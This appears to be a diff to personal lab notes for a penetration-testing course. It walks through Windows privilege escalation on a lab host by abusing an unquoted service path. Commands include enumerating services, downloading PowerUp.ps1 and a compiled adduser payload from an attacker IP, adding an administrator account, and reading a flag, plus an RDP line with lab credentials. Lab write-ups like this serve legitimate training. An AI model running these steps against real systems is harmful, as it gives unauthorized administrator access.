@@ -7,12 +7,83 @@ Use the provided command in listing 72 for write permissions.
 Replace the service's executable by renaming with a malicious binary and restart the service.
 
 xfreerdp /u:damian /p:ICannotThinkOfAPassword1! /v:192.168.192.221
+
 # Open the powershell 
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
 BackupMonitor   Running C:\BackupMonitor\BackupMonitor.exe
 ReynhSurveillance  Stopped C:\Enterprise Software\Monitoring Solution\Surveillance Apps\Reynh...
 
 
+# To confirm again with the WMIC
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+BackupMonitor                              C:\BackupMonitor\BackupMonitor.exe                                                                       
+ReynhSurveillance                          C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance.exe
 
+# Where I think 'ReynhSurveillance' is more relevant
+# Lets open the surveillance software path
+C:\Enterprise Software\Monitoring Solution\>icacls .
+. CLIENTWK221\damian:(OI)(CI)(RX,W)s
+  BUILTIN\Administrators:(OI)(CI)(F)
+  NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+  BUILTIN\Users:(OI)(CI)(RX)
 
+# Builtin users able to write in this parent folder
 
+# Test the user do have the service permissions
+PS C:\Users\damian> start-service ReynhSurveillance
+PS C:\Users\damian> stop-service ReynhSurveillance
+
+# No issue at all, now we will check the unquoted paths and containing spaces using automate tools
+PS C:\Users\damian> iwr -uri http://192.168.45.178/PowerUp.ps1 -Outfile Powerup.ps1
+PS C:\Users\damian> powershell -ep bypass
+PS C:\Users\damian> . .\Powerup.ps1
+PS C:\Users\damian> Get-UnquotedService
+
+ServiceName    : ReynhSurveillance
+Path           : C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance.exe
+ModifiablePath : @{ModifiablePath=C:\Enterprise Software\Monitoring Solution; IdentityReference=CLIENTWK221\damian;
+                 Permissions=System.Object[]}
+StartName      : .\roy
+AbuseFunction  : Write-ServiceBinary -Name 'ReynhSurveillance' -Path <HijackPath>
+CanRestart     : True
+Name           : ReynhSurveillance
+
+# Above results show ReynhSurveillance is vulnerable
+# Prepare the adduser payload and upload to the writable folder
+# Refer to adduser.C
+# Inside Kali OS
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe 
+chmod 777 adduser.exe
+
+# When a service is started and a process is created, the Windows CreateProcess function is used. Reviewing the first parameter of the function, lpApplicationName is used to specify the name and optionally the path to the executable file. If the provided string contains spaces and is not enclosed within quotation marks, it can be interpreted in various ways because it is unclear to the function where the file name ends and the arguments begin. To determine this, the function starts interpreting the path from left to right until a space is reached. For every space in the file path, the function uses the preceding part as file name by adding .exe and the rest as arguments.
+
+C:\Program.exe
+C:\Program Files\My.exe
+C:\Program Files\My Program\My.exe
+C:\Program Files\My Program\My service\service.exe
+
+# Upload the payload
+PS C:\Enterprise Software\Monitoring Solution> iwr -uri http://192.168.45.178/adduser.exe -Outfile Surveillance.exe
+
+# In following the loophole of the Windows CreateProcess lpApplicationName, we will use Surveillance.exe filename as it will be priority execute compare to 'Surveillance Apps'\ReynhSurveillance.exe
+
+# Execute the payload
+PS C:\Enterprise Software\Monitoring Solution> Write-ServiceBinary -Name 'ReynhSurveillance' -Path 'C:\Enterprise Software\Monitoring Solution\Surveillance.exe'
+
+ReynhSurveillance C:\Enterprise Software\Monitoring Solution\Surveillance.exe net user john Password123! /add && timeout ...
+
+PS C:\Enterprise Software\Monitoring Solution> Restart-Service ReynhSurveillance
+
+# Lets check the user john is being added to user and admin group
+net user
+...
+john
+...
+net localgroup administrators
+...
+john
+...
+
+start-process PowerShell -verb runas
+PS C:\Users\roy\Desktop> type flag.txt
+OS{d1e9b467afe807d9ba3a8f64d3c1469a}
